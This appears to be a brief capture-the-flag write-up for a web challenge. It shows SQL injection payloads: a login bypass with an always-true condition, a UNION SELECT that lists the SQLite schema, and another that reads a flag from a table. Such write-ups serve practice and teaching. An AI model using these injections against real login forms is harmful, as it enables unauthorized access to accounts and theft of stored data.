
The first we see is a website with a login and given the name we can guess we need to sql inject to login 
u: x
p: `' or 1=1--`



' UNION SELECT sql, name, null FROM sqlite_master; -- 

' UNION SELECT flag, null, null from more_table;--